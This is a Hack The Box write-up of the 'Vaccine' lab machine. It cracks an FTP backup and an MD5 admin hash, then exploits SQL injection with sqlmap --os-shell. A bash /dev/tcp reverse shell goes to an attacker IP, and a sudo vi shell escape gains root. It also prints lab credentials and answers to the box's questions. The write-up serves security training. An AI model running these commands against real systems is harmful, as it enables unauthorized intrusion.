<h1>⭐ Vaccine – Hack The Box Write-up ⭐</h1>

<p>
<img src="https://img.shields.io/badge/HTB-Vaccine-success" alt="HTB" />
<img src="https://img.shields.io/badge/Difficulty-Medium-orange" alt="Difficulty" />
<img src="https://img.shields.io/badge/OS-Linux-blue" alt="OS" />
<img src="https://img.shields.io/badge/Category-FTP%20%7C%20SQLi%20%7C%20Privilege%20Escalation-red" alt="Category" />
</p>

<hr />

<table style="border-collapse: collapse; width: auto; display: inline-table;">
<thead>
<tr>
<th style="background-color: #2b2b2b; color: #ffffff; padding: 10px; text-align: left;">Property</th>
<th style="background-color: #2b2b2b; color: #ffffff; padding: 10px; text-align: left;">Value</th>
</tr>
</thead>

<tbody>
<tr>
<td style="background-color: #1e1e1e; color: #ffffff; padding: 8px;">Difficulty</td>
<td style="background-color: #1e1e1e; color: #ffffff; padding: 8px;">Medium</td>
</tr>

<tr>
<td style="background-color: #1e1e1e; color: #ffffff; padding: 8px;">OS</td>
<td style="background-color: #1e1e1e; color: #ffffff; padding: 8px;">Linux</td>
</tr>

<tr>
<td style="background-color: #1e1e1e; color: #ffffff; padding: 8px;">IP</td>
<td style="background-color: #1e1e1e; color: #ffffff; padding: 8px;">10.129.x.x</td>
</tr>

<tr>
<td style="background-color: #1e1e1e; color: #ffffff; padding: 8px;">Category</td>
<td style="background-color: #1e1e1e; color: #ffffff; padding: 8px;">Hack The Box – Tier 2</td>
</tr>

<tr>
<td style="background-color: #1e1e1e; color: #ffffff; padding: 8px;">Tags</td>
<td style="background-color: #1e1e1e; color: #ffffff; padding: 8px;">FTP Anonymous, ZIP Cracking, John the Ripper, MD5, SQL Injection, PostgreSQL, sqlmap, RCE, SSH, Sudo, Vi</td>
</tr>
</tbody>
</table>

<hr />

<h2>Summary</h2>

<p>
<strong>Vaccine</strong> is a Linux machine from Hack The Box focused mainly on
<strong>enumeration, password cracking, SQL Injection, and privilege escalation</strong>.
</p>

<p>
During the initial enumeration, we discovered an FTP service that allowed anonymous access.
It contained a password-protected file called <code>backup.zip</code>.
Using <strong>John the Ripper</strong>, we cracked the ZIP password and accessed its contents.
</p>

<p>
Inside the backup, we found the source code of the web application, which contained an
MD5 hash corresponding to the password of the <strong>admin</strong> user.
After cracking this hash, we obtained the credentials required to access the web dashboard.
</p>

<p>
Once authenticated, we discovered that the <code>search</code> parameter was vulnerable to
<strong>SQL Injection</strong>. Using <strong>sqlmap</strong>, we identified PostgreSQL as the
database management system and achieved command execution through <code>--os-shell</code>.
</p>

<p>
Command execution initially gave us access as the <strong>postgres</strong> user.
We later found PostgreSQL credentials in the application source code and used them to connect
via SSH.
</p>

<p>
Finally, using <code>sudo -l</code>, we discovered that the <strong>postgres</strong> user
could execute <code>vi</code> as root. By abusing <code>vi</code>'s ability to execute system
commands, we obtained a <strong>root</strong> shell and captured the final flag.
</p>

<hr />

<h2>Key Concepts</h2>

<ul>
  <li>Service enumeration</li>
  <li>Anonymous FTP access</li>
  <li>Password-protected ZIP cracking</li>
  <li>John the Ripper</li>
  <li>MD5 hash cracking</li>
  <li>Web authentication</li>
  <li>SQL Injection</li>
  <li>PostgreSQL</li>
  <li>Stacked Queries</li>
  <li>Remote command execution</li>
  <li>sqlmap</li>
  <li>Reverse Shell</li>
  <li>SSH</li>
  <li>Sudo misconfiguration</li>
  <li>Privilege escalation using <code>vi</code></li>
</ul>

<hr />

<h2>Attack Flow</h2>

<ol>
  <li>Port and service enumeration</li>
  <li>Discovery of FTP on port 21</li>
  <li>Anonymous access to the FTP server</li>
  <li>Download of <code>backup.zip</code></li>
  <li>Extraction of the ZIP hash using <code>zip2john</code></li>
  <li>ZIP password cracking with John the Ripper</li>
  <li>Extraction of the backup files</li>
  <li>Discovery of the admin user's MD5 hash</li>
  <li>MD5 hash cracking</li>
  <li>Access to the web dashboard</li>
  <li>Discovery of SQL Injection in <code>search</code></li>
  <li>Exploitation using sqlmap</li>
  <li>Obtaining an OS shell</li>
  <li>Initial access as <code>postgres</code></li>
  <li>Discovery of PostgreSQL credentials</li>
  <li>SSH access</li>
  <li>Privilege enumeration using <code>sudo -l</code></li>
  <li>Abuse of <code>vi</code> running as root</li>
  <li>Obtaining a root shell</li>
  <li>Obtaining the root flag</li>
</ol>

<hr />

<h2>Connectivity Check</h2>

<p>
We first check that the target machine is reachable:
</p>

<pre>ping 10.129.x.x</pre>

<hr />

<h2>Enumeration</h2>

<h3>Port Scanning</h3>

<p>
We use Nmap to identify open ports and detect the running services and their versions:
</p>

<pre>nmap -sCV -q 10.129.x.x</pre>
<img src="https://github.com/3stefani/HTB-writeups/blob/main/Vaccine/img/1_scanning_with_nmap.png" alt="Scanning with Nmap">


<p>
The scan revealed three main services:
</p>

<table style="border-collapse: collapse; width: auto; display: inline-table;">
<thead>
<tr>
<th style="background: #4d4d4d; color: #ffffff; padding: 10px;">Port</th>
<th style="background: #4d4d4d; color: #ffffff; padding: 10px;">Service</th>
<th style="background: #4d4d4d; color: #ffffff; padding: 10px;">Information</th>
</tr>
</thead>

<tbody>
<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">21</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">FTP</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">vsftpd 3.0.3</td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">22</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">SSH</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">OpenSSH 8.0p1</td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">80</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">HTTP</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">Apache 2.4.41</td>
</tr>
</tbody>
</table>

<p>
The Nmap results also confirmed that the FTP server allows anonymous access:
</p>

<pre>ftp-anon: Anonymous FTP login allowed</pre>

<hr />

<h2>Anonymous FTP Access</h2>

<p>
We connect to the FTP service:
</p>

<pre>ftp 10.129.x.x</pre>

<p>
We use the following username:
</p>

<pre>anonymous</pre>

<p>
Once connected, we enumerate the available files:
</p>

<pre>ls</pre>

<p>
We find:
</p>

<pre>backup.zip</pre>

<p>
We download the file:
</p>

<pre>get backup.zip</pre>

<p>
The file is password-protected.
</p>

<hr />

<h2>ZIP File Cracking</h2>

<h3>Hash Generation</h3>

<p>
John the Ripper includes the <code>zip2john</code> utility, which extracts the necessary
information from a ZIP archive and converts it into a format that John can use for password cracking.
</p>

<pre>zip2john backup.zip &gt; hash.txt</pre>

<p>
We then use the <code>rockyou.txt</code> wordlist:
</p>

<pre>john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</pre>

<p>
The recovered password was:
</p>

<pre>741852963</pre>

<p>
We can verify the password by extracting the ZIP:
</p>

<pre>unzip backup.zip</pre>

<p>
The archive contained:
</p>

<ul>
  <li><code>index.php</code></li>
  <li><code>style.css</code></li>
</ul>

<hr />

<h2>Credential Discovery</h2>

<p>
When reviewing <code>index.php</code>, we found the authentication logic:
</p>

<pre>if($_POST['username'] === 'admin' &amp;&amp; md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3")</pre>

<p>
The use of:
</p>

<pre>md5($_POST['password'])</pre>

<p>
indicates that the password for the <strong>admin</strong> user is stored as an MD5 hash.
</p>

<p>
We save the hash and use John the Ripper:
</p>

<pre>john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt admin_hash.txt</pre>

<p>
We recovered the password:
</p>

<pre>qwerty789</pre>

<p>
Credentials:
</p>

<pre>admin:qwerty789</pre>

<hr />

<h2>Web Dashboard Access</h2>

<p>
We use the recovered credentials to log into the web application.
</p>

<p>
Once authenticated, we find a search field:
</p>

<pre>Search</pre>

<p>
After performing a search, we notice that the parameter appears directly in the URL:
</p>

<pre>http://10.129.x.x/dashboard.php?search=test</pre>

<hr />

<h2>SQL Injection Identification</h2>

<p>
We test a single quote:
</p>

<pre>http://10.129.x.x/dashboard.php?search=%27</pre>

<p>
The server responds with a PostgreSQL error:
</p>

<pre>ERROR: unterminated quoted string at or near "'"</pre>

<p>
This behavior indicates that the supplied value is being incorporated directly into an SQL query.
</p>

<p>
The source code found later in <code>dashboard.php</code> confirms the vulnerability:
</p>

<pre>$q = "Select * from cars where name ilike '%". $_REQUEST["search"] ."%'";</pre>

<p>
The <code>search</code> parameter is directly concatenated into the SQL query without using
parameterized queries.
</p>

<hr />

<h2>Exploitation with sqlmap</h2>

<p>
Because the application requires authentication, we use the session cookie
<code>PHPSESSID</code>.
</p>

<p>
We run:
</p>

<pre>sqlmap -u "http://10.129.x.x/dashboard.php?search=test" --cookie="PHPSESSID=&lt;SESSION_ID&gt;" --os-shell --batch</pre>

<p>
During the tests, sqlmap identified PostgreSQL as the database management system.
</p>

<p>
Among the injection types identified were:
</p>

<ul>
  <li>Boolean-based blind</li>
  <li>Error-based</li>
  <li>Stacked queries</li>
  <li>Time-based blind</li>
</ul>

<p>
One of the most important results was:
</p>

<pre>PostgreSQL &gt; 8.1 stacked queries</pre>

<p>
sqlmap subsequently used the following mechanism:
</p>

<pre>COPY ... FROM PROGRAM ...</pre>

<p>
to achieve command execution on the operating system.
</p>

<p>
We eventually obtained:
</p>

<pre>os-shell&gt;</pre>

<hr />

<h2>Reverse Shell</h2>

<p>
From the <code>os-shell</code>, we can execute commands on the system as the
<code>postgres</code> user.
</p>

<p>
To obtain an interactive shell, we use a reverse shell connection back to our Kali machine.
</p>

<p>
On Kali, we start the listener:
</p>

<pre>nc -lvnp 443</pre>

<p>
Then, from the <code>os-shell</code>, we execute:
</p>

<pre>bash -c "bash -i &gt;&amp; /dev/tcp/10.10.14.39/443 0&gt;&amp;1"</pre>

<p>
The connection provides us with a shell as:
</p>

<pre>postgres@vaccine:/var/lib/postgresql/11/main$</pre>

<p>
The initial reverse shell does not provide a fully interactive TTY, so some operations,
such as <code>sudo</code>, do not work correctly.
</p>

<p>
Instead of continuing with the reverse shell stabilization, we use the credentials found
in the application to connect directly via SSH.
</p>

<hr />

<h2>PostgreSQL Credentials</h2>

<p>
When reviewing <code>/var/www/html/dashboard.php</code>, we find the credentials used
by the application to connect to PostgreSQL:
</p>

<pre>$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");</pre>

<p>
Recovered credentials:
</p>

<pre>postgres:P@s5w0rd!</pre>

<hr />

<h2>SSH Access</h2>

<p>
We use the credentials to connect directly via SSH:
</p>

<pre>ssh postgres@10.129.x.x</pre>

<p>
Once authenticated, we check the contents of the home directory:
</p>

<pre>ls</pre>

<p>
We find the user flag:
</p>

<pre>user.txt</pre>

<p>
The user flag is obtained with:
</p>

<pre>cat user.txt</pre>

<p>
✅ <strong>User flag obtained.</strong>
</p>

<hr />

<h2>Privilege Escalation</h2>

<h3>Sudo Enumeration</h3>

<p>
We check which commands the <code>postgres</code> user can execute with sudo:
</p>

<pre>sudo -l</pre>

<p>
The system returns:
</p>

<pre>(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf</pre>

<p>
This means that <code>postgres</code> can execute the <code>vi</code> editor with
root privileges.
</p>

<hr />

<h2>Vi Abuse</h2>

<p>
We execute:
</p>

<pre>sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf</pre>

<p>
This opens <code>vi</code> with root privileges.
</p>

<p>
We do not need to modify the <code>pg_hba.conf</code> file.
</p>

<p>
Inside <code>vi</code>, we use:
</p>

<pre>:!bash</pre>

<p>
The <code>:!</code> command allows us to execute system commands from within the editor.
By executing <code>bash</code>, we obtain a shell with the privileges under which
<code>vi</code> is running.
</p>

<p>
Since <code>vi</code> was executed through <code>sudo</code>, the resulting shell has
root privileges.
</p>

<p>
We verify our identity:
</p>

<pre>whoami</pre>

<p>
Result:
</p>

<pre>root</pre>

<p>
We can also observe the prompt:
</p>

<pre>root@vaccine:/var/lib/postgresql#</pre>

<p>
This confirms that privilege escalation was successful.
</p>

<hr />

<h2>Obtaining the Root Flag</h2>

<p>
Once we have a root shell, we access the <code>/root</code> directory:
</p>

<pre>cd /root</pre>

<p>
We enumerate its contents:
</p>

<pre>ls</pre>

<p>
Finally, we read:
</p>

<pre>cat root.txt</pre>

<p>
✅ <strong>Root flag successfully obtained.</strong>
</p>

<hr />

<h2>Hack The Box Questions</h2>

<table style="border-collapse: collapse; width: auto; display: inline-table;">
<thead>
<tr>
<th style="background: #4d4d4d; color: #ffffff; padding: 10px;">#</th>
<th style="background: #4d4d4d; color: #ffffff; padding: 10px;">Question</th>
<th style="background: #4d4d4d; color: #ffffff; padding: 10px;">Answer</th>
</tr>
</thead>

<tbody>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">1</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">Besides SSH and HTTP, what other service is hosted on this box?</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;"><strong>FTP</strong></td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">2</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">What username can be configured to allow login with any password?</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;"><strong>anonymous</strong></td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">3</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">What is the name of the file downloaded over this service?</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;"><strong>backup.zip</strong></td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">4</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">What script generates a crackable hash from a password-protected ZIP?</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;"><strong>zip2john</strong></td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">5</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">What is the password for the admin user?</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;"><strong>qwerty789</strong></td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">6</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">What option can be passed to sqlmap to try to get command execution via SQL Injection?</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;"><strong>--os-shell</strong></td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">7</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;">What program can the postgres user run as root using sudo?</td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px;"><strong>vi</strong></td>
</tr>

</tbody>
</table>

<hr />

<h2>Tools Used</h2>

<table style="border-collapse: collapse; width: auto; display: inline-table;">
<thead>
<tr>
<th style="background: #4d4d4d; color: #ffffff; padding: 10px; border: 1px solid #30363d;">Category</th>
<th style="background: #4d4d4d; color: #ffffff; padding: 10px; border: 1px solid #30363d;">Tools</th>
</tr>
</thead>

<tbody>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;"><strong>Reconnaissance</strong></td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;">ping, nmap, browser</td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;"><strong>Enumeration</strong></td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;">nmap, FTP, manual web enumeration</td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;"><strong>Credential Access</strong></td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;">zip2john, John the Ripper, rockyou.txt</td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;"><strong>Exploitation</strong></td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;">SQL Injection, sqlmap, --os-shell</td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;"><strong>Remote Access</strong></td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;">SSH, Netcat</td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;"><strong>Privilege Escalation</strong></td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;">sudo, vi, Bash</td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;"><strong>Post-Exploitation</strong></td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;">Linux commands, filesystem enumeration</td>
</tr>

</tbody>
</table>

<hr />

<h2>Vulnerabilities and Techniques</h2>

<table style="border-collapse: collapse; width: auto; display: inline-table;">
<thead>
<tr>
<th style="background: #4d4d4d; color: #ffffff; padding: 10px; border: 1px solid #30363d;">Vulnerability / Technique</th>
<th style="background: #4d4d4d; color: #ffffff; padding: 10px; border: 1px solid #30363d;">Description</th>
</tr>
</thead>

<tbody>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;"><strong>Anonymous FTP</strong></td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;">The FTP service allows anonymous access and exposes a backup file.</td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;"><strong>Password-Protected Backup</strong></td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;">The backup.zip file contains sensitive information protected only by a weak password.</td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;"><strong>Weak Password / Hash Cracking</strong></td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;">John the Ripper can recover passwords through dictionary attacks.</td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;"><strong>SQL Injection</strong></td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;">The search parameter is directly concatenated into a vulnerable SQL query.</td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;"><strong>Command Execution</strong></td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;">The SQL Injection allows sqlmap to achieve command execution on the system.</td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;"><strong>Sudo Misconfiguration</strong></td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;">The postgres user can execute vi as root.</td>
</tr>

<tr>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;"><strong>Vi Shell Escape</strong></td>
<td style="background: #2b2b2b; color: #c9d1d9; padding: 10px; border: 1px solid #30363d;">The :!bash feature of vi allows us to obtain a shell with root privileges.</td>
</tr>

</tbody>
</table>

<hr />

<h2>Key Takeaways</h2>

<ul>
  <li>Service enumeration is essential before attempting to exploit a machine.</li>
  <li>Anonymous FTP access can expose sensitive information.</li>
  <li>Backup files must be properly secured.</li>
  <li>Weak passwords can be recovered through dictionary attacks.</li>
  <li>MD5 should not be used for password storage.</li>
  <li>SQL queries should use parameterized queries.</li>
  <li>Credentials stored directly in source code can compromise other services.</li>
  <li>Sudo rules should be strictly limited to the actions that are actually required.</li>
  <li>Editors such as <code>vi</code> can provide shell escapes.</li>
  <li>A poorly configured sudo rule can directly lead to root privilege escalation.</li>
</ul>

<hr />

<h2>Conclusion</h2>

<p>
Vaccine demonstrates how several seemingly independent vulnerabilities and security
misconfigurations can be chained together to achieve complete system compromise.
</p>

<p>
The attack begins with an insecure FTP configuration that allows anonymous access to a backup.
Cracking the archive reveals web application credentials, which then provide access to an
application vulnerable to SQL Injection.
</p>

<p>
The SQL Injection provides command execution and initial access as <code>postgres</code>.
Credentials exposed in the application source code then allow us to obtain stable SSH access.
</p>

<p>
Finally, an incorrect <code>sudo</code> configuration allows <code>vi</code> to be executed as
root and escaped to a privileged shell.
</p>

<p>
<strong>Result: complete compromise of the machine and successful retrieval of both the user and root flags.</strong>
</p>

<hr />

<h2>⚠️ Legal Disclaimer</h2>

<p>
This content is <strong>for educational purposes only</strong>.
</p>

<p>
All testing was performed in a controlled laboratory environment provided by
<strong>Hack The Box</strong>.
</p>

<p>
Do not use these techniques against systems, applications, or networks without explicit authorization.
</p>
